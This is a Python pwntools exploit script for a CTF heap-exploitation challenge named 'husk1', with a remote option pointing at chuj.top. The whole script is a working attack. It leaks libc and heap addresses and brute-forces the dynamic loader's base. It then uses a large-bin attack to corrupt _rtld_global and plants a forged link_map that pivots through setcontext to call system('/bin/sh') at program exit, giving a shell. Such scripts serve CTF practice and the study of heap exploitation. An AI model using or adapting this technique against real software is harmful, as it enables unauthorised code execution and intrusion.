#! /usr/bin/env python3
from pwn import *

arch = 64
challenge = './husk1'

context.os = 'linux'
context.log_level = 'debug'
if arch == 64:
    context.arch = 'amd64'
if arch == 32:
    context.arch = 'i386'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(challenge)
libc = ELF('libc.so.6')

local = 1
if local:
    p = process(challenge)
else:
    p = remote('chuj.top', '53178')


def debug():
    gdb.attach(p)
    # gdb.attach(p,"b *$rebase(0xDB4C)\nb *$rebase()")
    # pause()


def add(size, content=''):
    p.sendlineafter('>>', '1')
    p.sendlineafter('Size:', str(size))
    if content != '':
        p.sendafter('Content:', content)


def delete(index):
    p.sendlineafter('>>', '2')
    p.sendlineafter('Index:', str(index))


def show(index):
    p.sendlineafter('>>', '3')
    p.sendlineafter('Index:', str(index))


def edit(index, content):
    p.sendlineafter('>>', '4')
    p.sendlineafter('Index:', str(index))
    p.sendafter('Content:', content)


for x in range(0,16):
    for y in range(0,16):
        try:
            
            local = 1
            if local:
                p = process(challenge)
            else:
                p = remote('chuj.top', '53178')

            add(0x520, 'a'*0x520)  # 0
            add(0x428, 'b'*0x428)  # 1
            add(0x500, 'c'*0x500)  # 2
            add(0x420, 'd'*0x420)  # 3
            debug()
            delete(0)

            add(0x600, 'c'*0x600)  # 4
            add(0x600, 'c'*0x600)  # 5

            show(0)
            
            p.recvuntil('Content: ')
            # sleep(0.1)
            # sleep(0.1)
            # libc.address = u64(p.recvuntil(b'\x7f').ljust(8, b'\x00'))-0x1eb010
            libc.address = u64(p.recv(6).ljust(8, b'\x00'))-0x1eb010
            log.success("libc.address: "+hex(libc.address))
            # ld = 0x1f3000+libc.address
            main_arena_xx = libc.address+0x1eb010
            global_max_fast = libc.address + 0x1edb78
            log.success("global_max_fast: "+hex(global_max_fast))

            set_context = libc.sym['setcontext'] + 61
            log.success("set_context: "+hex(set_context))
            ret = libc.sym['setcontext'] + 0x14E
            log.success("ret: "+hex(ret))
            pop_rdi_rbp = libc.address + 0x00000000000277e9
            binsh = next(libc.search(b'/bin/sh'))
            log.success("binsh: "+hex(binsh))
            system = libc.symbols["system"]
            log.success("system: "+hex(system))
            # print hex(libc_base + 0x2043ac)

            edit(0, 'a'*0x10)
            show(0)
            p.recvuntil('a'*0x10)
            heap_addr = u64(p.recv(6).ljust(8, b'\x00'))
            log.success('heap_addr: ' + hex(heap_addr))
            edit(0, p64(main_arena_xx)*2)  # ! 修复


            # 未归位的 large bin
            delete(2)
            delete(4)
            offset = 1 << 20 #! 从0开始试，一般到 1 就可以了
            offset += x << 16
            offset += y << 12
            # offset = 0x1f3000
            # offset = 0x1f8000
            print("try offset:\t" + hex(offset))
            # ld = libc.address + 0x1f8000
            ld = libc.address + offset
            print(hex(ld))

            # _rtld_global = ld + 0x2d060
            _rtld_global = ld + 0x2d060
            # _rtld_global = libc.address + 0x225060
            log.success("_rtld_global: "+hex(_rtld_global))
            # * 控制large bin 的 bk_nextsize

            edit(0, p64(0) + p64(0) + p64(0) + p64(_rtld_global - 0x20))

            add(0x600, b'large bin attack!!')  # ! 写入堆地址
        except EOFError:
            p.close()
        else:
            fake_link_map_addr = heap_addr + 0x960
            log.success('fake_link_map_addr: ' + hex(fake_link_map_addr))
            # l_next = libc.address + 0x226730
            l_next = ld + 0x2E730
            payload = p64(0) + p64(l_next) + p64(0) + p64(fake_link_map_addr)
            #! 将l_next需要还原 l_real设置为自己伪造的link_map堆块地址
            # ! <---array[1] 先执行一个 ret 顺便修改 rdx 指向这里
            payload += p64(set_context) + p64(ret)

            payload += p64(binsh)  # ! l_info[0] rsp
            payload += p64(0)
            payload += p64(system)
            payload += b'\x00'*0x80  # ! 0x28+0x80 = 0xa8

            payload += p64(fake_link_map_addr + 0x40)  # * rsp rdx+0xa0
            payload += p64(pop_rdi_rbp)  # * rip 0xa8 rcx push rcx ret

            payload = payload.ljust(0x100, b'\x00')
            # * l->l_info[26] l->l_info[27] l->l_info[28]
            payload += p64(fake_link_map_addr + 0x110) + p64(0x10)

            # * array = (l->l_addr + l->l_info[27])
            # * l->l_info[28] l->l_info[29] i = l->l_info[29] / 8 = 2
            payload += p64(fake_link_map_addr + 0x120) + p64(0x10)
            #! [26] [28] 指自己就行 [27] [29]直接写想要的值就可以

            payload = payload.ljust(0x308, b'\x00')
            payload += p64(0x800000000)  # ! l->l_init_called = 1 调试一下就知道 不管也行
            edit(2, payload)
            edit(1, b'b'*0x420 + p64(fake_link_map_addr + 0x20))  # ! 堆溢出去修改 l->l_addr

            # getshell
            p.sendlineafter('>>', '5')
            p.sendlineafter('name:', 'exit')

            p.interactive()